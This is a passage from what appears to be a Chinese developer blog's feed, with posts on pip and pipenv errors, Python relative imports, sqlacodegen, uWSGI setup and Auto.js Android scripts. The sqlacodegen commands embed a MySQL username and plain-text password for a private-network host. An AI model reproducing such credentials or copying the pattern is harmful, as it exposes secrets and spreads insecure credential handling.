(1.25.10) or chardet (3.0.4) doesn’t match a supported version"></a>requests报错 RequestsDependencyWarning: urllib3 (1.25.10) or chardet (3.0.4) doesn’t match a supported version</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install --upgrade requests</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="THESE-PACKAGES-DO-NOT-MATCH-THE-HASHES-FROM-THE-REQUIREMENTS-FILE-If-you-have-updated-the-package-versions-please-update-the-hashes-Otherwise-examine-the-package-contents-carefully-someone-may-have-tampered-with-them"><a href="#THESE-PACKAGES-DO-NOT-MATCH-THE-HASHES-FROM-THE-REQUIREMENTS-FILE-If-you-have-updated-the-package-versions-please-update-the-hashes-Otherwise-examine-the-package-contents-carefully-someone-may-have-tampered-with-them" class="headerlink" title="THESE PACKAGES DO NOT MATCH THE HASHES FROM THE REQUIREMENTS FILE. If you have updated the package versions, please update the hashes. Otherwise, examine the package contents carefully; someone may have tampered with them"></a>THESE PACKAGES DO NOT MATCH THE HASHES FROM THE REQUIREMENTS FILE. If you have updated the package versions, please update the hashes. Otherwise, examine the package contents carefully; someone may have tampered with them</h2><p>这个问题主要是在使用pipenv命令进行安装twisted出现的:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pipenv install &quot;C:\Users\Administrator\Downloads\Twisted-20.3.0-cp38-cp38-win32.whl&quot;</span><br></pre></td></tr></table></figure><p>解决方法是首先进入pipenv环境，然后替换使用pip命令进行更新操作：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; pipenv shell</span><br><span class="line">&gt; pip install --upgrade &quot;C:\Users\Administrator\Downloads\Twisted-20.3.0-cp38-cp38-win32.whl&quot;</span><br><span class="line">或者</span><br><span class="line">&gt; pip install --no-cache-dir &quot;C:\Users\Administrator\Downloads\Twisted-20.3.0-cp38-cp38-win32.whl&quot;</span><br></pre></td></tr></table></figure><h2 id="ImportError-attempted-relative-import-with-no-known-parent-package"><a href="#ImportError-attempted-relative-import-with-no-known-parent-package" class="headerlink" title="ImportError: attempted relative import with no known parent package"></a>ImportError: attempted relative import with no known parent package</h2><p>Pycharm或者编译器打开项目，过多一层或者过少一层打开目录都会导致导入错误，是因为编译器打开那个目录，就将python的工作目录设置那一层，只有正确的目录结构才能导入正确包。</p><p>. 和 ..导入 相对位置是执行文件的当前目录</p><p>因为python的相对导入需要用到父级包作为相对的参考位置<br>而这个位置是通过__name__属性和__package__属性进行决定的，<br>当 <strong>name</strong> 等于 __main__和 <strong>package</strong> = None的时候导致的问题没有父级包</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Python2-7-installaction-更新到2019年9月1日&quot;&gt;&lt;a href=&quot;#Python2-7-installaction-更新到2019年9月1日&quot; class=&quot;headerlink&quot; title=&quot;Python2.7 installact</summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="程序语言" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Python" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/"/>
    
    
    <category term="python" scheme="https://seniortesting.club/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Python SQLAlchemy Linux安装及其环境配置</title>
    <link href="https://seniortesting.club/posts/ITwraDciAW/"/>
    <id>https://seniortesting.club/posts/ITwraDciAW/</id>
    <published>2021-04-05T01:52:55.000Z</published>
    <updated>2021-04-18T13:00:39.467Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SQLAlchemy-model-code-generator-更新到2019年8月10日"><a href="#SQLAlchemy-model-code-generator-更新到2019年8月10日" class="headerlink" title="SQLAlchemy model code generator[更新到2019年8月10日]"></a>SQLAlchemy model code generator[更新到2019年8月10日]</h2><p>Python环境下执行如下命令全局安装<code>sqlacodegen</code></p><figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">pip install pymysql sqlacodegen</span><br><span class="line">sqlacodegen --noviews --noindexes --nojoined --outfile models.py  mysql+pymysql://syscorer:s6s@#@!L0ngh@192.168.1.7:3306/heapstack </span><br><span class="line">sqlacodegen --noviews --noindexes --nojoined --noinflect --noclasses --outfile models.py  mysql+pymysql://syscorer:s6s@#@!L0ngh@192.168.1.7:3306/heapstack </span><br><span class="line">sqlacodegen --tables abc --noviews --noindexes --nojoined --noinflect --noclasses --outfile models.py  mysql+pymysql://syscorer:s6s@#@!L0ngh@192.168.1.7:3306/heapstack </span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;SQLAlchemy-model-code-generator-更新到2019年8月10日&quot;&gt;&lt;a href=&quot;#SQLAlchemy-model-code-generator-更新到2019年8月10日&quot; class=&quot;headerlink&quot; title=&quot;SQ</summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="程序语言" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Python" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/"/>
    
    <category term="框架类库工具" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/%E6%A1%86%E6%9E%B6%E7%B1%BB%E5%BA%93%E5%B7%A5%E5%85%B7/"/>
    
    <category term="sqlalchemy" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/%E6%A1%86%E6%9E%B6%E7%B1%BB%E5%BA%93%E5%B7%A5%E5%85%B7/sqlalchemy/"/>
    
    
    <category term="python" scheme="https://seniortesting.club/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Python Uwsgi Linux安装及其环境配置</title>
    <link href="https://seniortesting.club/posts/cLeP5dFFRi/"/>
    <id>https://seniortesting.club/posts/cLeP5dFFRi/</id>
    <published>2021-04-05T01:52:55.000Z</published>
    <updated>2021-04-18T13:00:39.467Z</updated>
    
    <content type="html"><![CDATA[<h2 id="uwsgiLinux安装-更新到2019年8月10日"><a href="#uwsgiLinux安装-更新到2019年8月10日" class="headerlink" title="uwsgiLinux安装[更新到2019年8月10日]"></a><code>uwsgi</code>Linux安装[更新到2019年8月10日]</h2><p><a href="https://uwsgi-docs.readthedocs.io/en/latest/Install.html#installing-from-source" target="_blank" rel="noopener">How to install uwsgi</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install build-essential python3-dev</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Install the latest stable release:</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> pip install uwsgi</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ... or <span class="keyword">if</span> you want to install the latest LTS (long term support) release,</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo pip install https://projects.unbit.it/downloads/uwsgi-lts.tar.gz</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> uwsgi --version</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo mkdir /var/<span class="built_in">log</span>/uwsgi</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo mkdir /etc/uwsgi</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo chown -R www-data:www-data  /var/<span class="built_in">log</span>/uwsgi</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo chmod a+x /etc/uwsgi</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> pip install uwsgitop</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="安装uwsgi服务"><a href="#安装uwsgi服务" class="headerlink" title="安装uwsgi服务"></a>安装uwsgi服务</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo nano /lib/systemd/system/uwsgi.service</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[Unit]</span><br><span class="line">Description=uWSGI Emperor service</span><br><span class="line">After=syslog.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">ExecStart=/usr/local/bin/uwsgi --master --ini /etc/uwsgi/emperor.ini</span><br><span class="line">Restart=always</span><br><span class="line">KillSignal=SIGQUIT</span><br><span class="line">Type=notify</span><br><span class="line">StandardError=syslog</span><br><span class="line">NotifyAccess=all</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="uwsgi参数"><a href="#uwsgi参数" class="headerlink" title="uwsgi参数"></a>uwsgi参数</h2><ul><li>chdir=/xxx/xxx # 指定项目目录</li><li>home=/xxx/xxx # 指定虚拟环境变量</li><li>wsgi-file=xxx # 指定加载WSGI文件</li><li>socket=xxx # 指定uwsgi的客户端将要连接的socket的路径（使用UNIX socket的情况）或者地址（使用网络地址的情况）。</li><li>callable=xxx # uWSGI加载的模块中哪个变量将被调用</li><li>master=true # 指定启动主进程</li><li>processes=4 # 设置工作进程的数量</li><li>threads=2 # 设置每个工作进程的线程数</li><li>vacuum=true # 当服务器退出时自动删除unix socket文件和pid文件</li><li>logfile-chmod=644 # 指定日志文件的权限</li><li>daemonize=%(chdir)/xxx.log # 进程在后台运行，并将日志打印到指定文件</li><li>pidfile=%(chdir)/xxx.pid # 在失去权限前，将主进程pid写到指定的文件</li><li>uid=xxx # uWSGI服务器运行时的用户id</li><li>gid=xxx # uWSGI服务器运行时的用户组id</li><li>procname-prefix-spaced=xxx # 指定工作进程名称的前缀</li></ul><h2 id="异常安装问题"><a href="#异常安装问题" class="headerlink" title="异常安装问题"></a>异常安装问题</h2><ul><li>Unknown distribution option: ‘descriptions’</li></ul><blockquote><p>解决方法: apt-get install build-essential python3-dev</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;uwsgiLinux安装-更新到2019年8月10日&quot;&gt;&lt;a href=&quot;#uwsgiLinux安装-更新到2019年8月10日&quot; class=&quot;headerlink&quot; title=&quot;uwsgiLinux安装[更新到2019年8月10日]&quot;&gt;&lt;/a&gt;&lt;code&gt;u</summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="程序语言" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Python" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/"/>
    
    <category term="框架类库工具" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/%E6%A1%86%E6%9E%B6%E7%B1%BB%E5%BA%93%E5%B7%A5%E5%85%B7/"/>
    
    <category term="uwsgi" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/%E6%A1%86%E6%9E%B6%E7%B1%BB%E5%BA%93%E5%B7%A5%E5%85%B7/uwsgi/"/>
    
    
    <category term="python" scheme="https://seniortesting.club/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>autojs常用脚本片段整理</title>
    <link href="https://seniortesting.club/posts/AVOOZOBZ1v/"/>
    <id>https://seniortesting.club/posts/AVOOZOBZ1v/</id>
    <published>2021-03-31T15:30:04.000Z</published>
    <updated>2021-04-18T13:00:39.459Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>此处整理一些常用的autojs脚本片段,便于查询.</p></blockquote><h2 id="1-如何优雅的开启”无障碍服务”"><a href="#1-如何优雅的开启”无障碍服务”" class="headerlink" title="1. 如何优雅的开启”无障碍服务” ?"></a>1. 如何优雅的开启”无障碍服务” ?</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;ui&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 误区一：使用线程开启无障碍</span></span><br><span class="line"><span class="comment">// 浪费CPU和内存资源，不必要的线程</span></span><br><span class="line"><span class="comment">// threads.start(function() &#123;</span></span><br><span class="line"><span class="comment">//      auto.waitFor();</span></span><br><span class="line"><span class="comment">// &#125;);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 误区二：直接使用auto()</span></span><br><span class="line"><span class="comment">// 对用户不友好</span></span><br><span class="line"><span class="comment">// auto();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 正确示范：</span></span><br><span class="line"><span class="comment">// 通过一个开关表示无障碍权限是否开启</span></span><br><span class="line"><span class="comment">// 如果用户没有开启直接运行则提示</span></span><br><span class="line"></span><br><span class="line">ui.layout(</span><br><span class="line">    &lt;vertical&gt;</span><br><span class="line">        &lt;appbar&gt;</span><br><span class="line">            &lt;toolbar title=<span class="string">&quot;UI脚本使用无障碍服务的最佳实践&quot;</span>/&gt;</span><br><span class="line">        &lt;/appbar&gt;</span><br><span class="line">        &lt;Switch id=<span class="string">&quot;autoService&quot;</span> text=<span class="string">&quot;开启无障碍服务&quot;</span> checked=<span class="string">&quot;&#123;&#123;auto.service != null&#125;&#125;&quot;</span> padding=<span class="string">&quot;8 8 8 8&quot;</span> textSize=<span class="string">&quot;15sp&quot;</span>/&gt;</span><br><span class="line">        &lt;Switch id=<span class="string">&quot;switchEnbleFloating&quot;</span> text=<span class="string">&quot;开启悬浮窗&quot;</span> checked=<span class="string">&quot;false&quot;</span> padding=<span class="string">&quot;8 8 8 8&quot;</span> textSize=<span class="string">&quot;15sp&quot;</span> textColor=<span class="string">&quot;red&quot;</span> /&gt;</span><br><span class="line">        &lt;button id=<span class="string">&quot;start&quot;</span> text=<span class="string">&quot;开始运行&quot;</span>/&gt;</span><br><span class="line">    &lt;/vertical&gt;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">ui.autoService.on(<span class="string">&quot;check&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">checked</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 用户勾选无障碍服务的选项时，跳转到页面让用户去开启</span></span><br><span class="line">    <span class="keyword">if</span>(checked &amp;&amp; auto.service == <span class="literal">null</span>) &#123;</span><br><span class="line">        app.startActivity(&#123;</span><br><span class="line">            action: <span class="string">&quot;android.settings.ACCESSIBILITY_SETTINGS&quot;</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!checked &amp;&amp; auto.service != <span class="literal">null</span>)&#123;</span><br><span class="line">        auto.service.disableSelf();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 当用户回到本界面时，resume事件会被触发</span></span><br><span class="line">ui.emitter.on(<span class="string">&quot;resume&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 此时根据无障碍服务的开启情况，同步开关的状态</span></span><br><span class="line">    ui.autoService.setChecked(auto.service != <span class="literal">null</span>);</span><br><span class="line">    <span class="comment">// ui.autoService.checked = auto.service != null;</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 用户勾选悬浮窗的选项时，跳转到页面让用户去开启 </span></span><br><span class="line">ui.switchEnbleFloating.on(<span class="string">&quot;check&quot;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">checked</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (checked) &#123; <span class="comment">//  &amp;&amp; auto.service == null</span></span><br><span class="line">        app.startActivity(&#123;</span><br><span class="line">            action: <span class="string">&quot;android.settings.action.MANAGE_OVERLAY_PERMISSION&quot;</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!checked &amp;&amp; auto.service != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// auto.service.disableSelf();</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 点击启动线程</span></span><br><span class="line">ui.start.on(<span class="string">&quot;click&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//程序开始运行之前判断无障碍服务</span></span><br><span class="line">    <span class="keyword">if</span>(auto.service == <span class="literal">null</span>) &#123;</span><br><span class="line">        toast(<span class="string">&quot;请先开启无障碍服务！&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    main();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 这里写脚本的主逻辑</span></span><br><span class="line">    threads.start(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        log(<span class="string">&quot;开始运行&quot;</span>);</span><br><span class="line">        sleep(<span class="number">2000</span>);</span><br><span class="line">        log(<span class="string">&quot;运行结束&quot;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="2-UI编程的一些注意事项"><a href="#2-UI编程的一些注意事项" class="headerlink" title="2. UI编程的一些注意事项"></a>2. UI编程的一些注意事项</h2><ul><li><ol><li>不管你的代码多么少, <code>&quot;ui&quot;;</code> 这个字符串,必须放在第一行,在它之上,不能有任何的代码和注释.</li></ol></li><li><ol start="2"><li>UI线程中除函数和公用变量外不要写任何流程性质的代码,如果要写流程,必须使用线程</li></ol></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">threads.start(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//这里写你的流程代码</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ul><li><ol start="3"><li>使用线程时,如果要对UI中的数据进行修改,最好使用下面的方法来执行:</li></ol></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">threads.start(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//流程代码</span></span><br><span class="line">    ui.run(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">        <span class="comment">//这里写针对UI的操作</span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ul><li><ol start="4"><li>为了方便管理,所有开的线程,根据不同功能,最好都定义各个线程的变量名</li></ol></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Thread = threads.start(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><ol start="5"><li>线程函数,不能简写 观察上面的代码,你会发现:</li></ol></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ui.run(<span class="function">()=&gt;</span>&#123;&#125;);</span><br></pre></td></tr></table></figure><p>而在线程 threads.start();中,我的写法是:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">threads.start(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><ol start="6"><li>使用<code>setVisibility()</code>方法时,一定要 <code>importClass(android.view.View);</code><br>括号中的属性包括:</li></ol></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">View.GONE <span class="comment">//完全隐藏控件</span></span><br><span class="line">View.INVISIBLE <span class="comment">//隐藏控件,但保留控件的位置</span></span><br><span class="line">View.VISIBLE <span class="comment">//默认属性, 显示控件</span></span><br></pre></td></tr></table></figure><ul><li><ol start="7"><li>针对text控件的对齐 gravity 要在 linear 布局中进行设置,例如</li></ol></li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">linear</span> <span class="attr">gravity</span>=<span class="string">&quot;right|center&quot;</span> <span class="attr">w</span>=<span class="string">&quot;80&quot;</span> <span class="attr">h</span>=<span class="string">&quot;*&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">text</span> <span class="attr">text</span>=<span class="string">&quot;当前速度: &quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">textColor</span>=<span class="string">&quot;#FFFFFF&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">textSize</span>=<span class="string">&quot;16sp&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">linear</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="3-Intent列表-打开对应的Intent页面"><a href="#3-Intent列表-打开对应的Intent页面" class="headerlink" title="3. Intent列表,打开对应的Intent页面"></a>3. Intent列表,打开对应的Intent页面</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> intent = <span class="keyword">new</span> Intent();</span><br><span class="line"><span class="comment">// vpnIntent.setAction(&quot;android.net.vpn.SETTINGS&quot;);</span></span><br><span class="line">intent.setAction(<span class="string">&quot;android.settings.ACCESSIBILITY_SETTINGS&quot;</span>); <span class="comment">//辅助功能</span></span><br><span class="line">intent.setAction(<span class="string">&quot;android.settings.ADD_ACCOUNT_SETTINGS&quot;</span>); <span class="comment">//添加账户</span></span><br><span class="line">intent.setAction(<span class="string">&quot;android.settings.AIRPLANE_MODE_SETTINGS&quot;</span>); <span class="comment">//系统设置首页</span></span><br><span class="line">intent.setAction(<span class="string">&quot;android.settings.APN_SETTINGS&quot;</span>); <span class="comment">//APN设置</span></span><br><span class="line">intent.setAction(<span class="string">&quot;android.settings.APPLICATION_SETTINGS&quot;</span>); <span class="comment">//应用管理</span></span><br><span class="line">intent.setAction(<span class="string">&quot;android.settings.BATTERY_SAVER_SETTINGS&quot;</span>); <span class="comment">//节电助手</span></span><br><span class="line">intent.setAction(<span class="string">&quot;android.settings.BLUETOOTH_SETTINGS&quot;</span>); <span class="comment">//蓝牙</span></span><br><span class="line">intent.setAction(<span class="string">&quot;android.settings.CAPTIONING_SETTINGS&quot;</span>); <span class="comment">//字幕</span></span><br><span class="line">intent.setAction(<span class="string">&quot;android.settings.CAST_SETTINGS&quot;</span>); <span class="comment">//无线显示</span></span><br><span class="line">intent.setAction(<span class="string">&quot;android.settings.DATA_ROAMING_SETTINGS&quot;</span>); <span class="comment">//移动网络</span></span><br><span class="line">intent.setAction(<span class="string">&quot;android.settings.DATE_SETTINGS&quot;</span>); <span class="comment">//日期和时间设置</span></span><br><span class="line">intent.setAction(<span class="string">&quot;android.settings.DEVICE_INFO_SETTINGS&quot;</span>); <span class="comment">//关于手机</span></span><br><span class="line">intent.setAction(<span class="string">&quot;android.settings.DISPLAY_SETTINGS&quot;</span>); <span class="comment">//显示设置</span></span><br><span class="line">intent.setAction(<span class="string">&quot;android.settings.DREAM_SETTINGS&quot;</span>); <span class="comment">//互动屏保设置</span></span><br><span class="line">intent.setAction(<span class="string">&quot;android.settings.HARD_KEYBOARD_SETTINGS&quot;</span>); <span class="comment">//实体键盘</span></span><br><span class="line">intent.setAction(<span class="string">&quot;android.settings.HOME_SETTINGS&quot;</span>); <span class="comment">//应用权限,默认应用设置,特殊权限</span></span><br><span class="line">intent.setAction(<span class="string">&quot;android.settings.IGNORE_BATTERY_OPTIMIZATION_SETTINGS&quot;</span>); <span class="comment">//忽略电池优化设置</span></span><br><span class="line">intent.setAction(<span class="string">&quot;android.settings.INPUT_METHOD_SETTINGS&quot;</span>); <span class="comment">//可用虚拟键盘设置</span></span><br><span class="line">intent.setAction(<span class="string">&quot;android.settings.INPUT_METHOD_SUBTYPE_SETTINGS&quot;</span>); <span class="comment">//安卓键盘语言设置(AOSP)</span></span><br><span class="line">intent.setAction(<span class="string">&quot;android.settings.INTERNAL_STORAGE_SETTINGS&quot;</span>); <span class="comment">//内存和存储</span></span><br><span 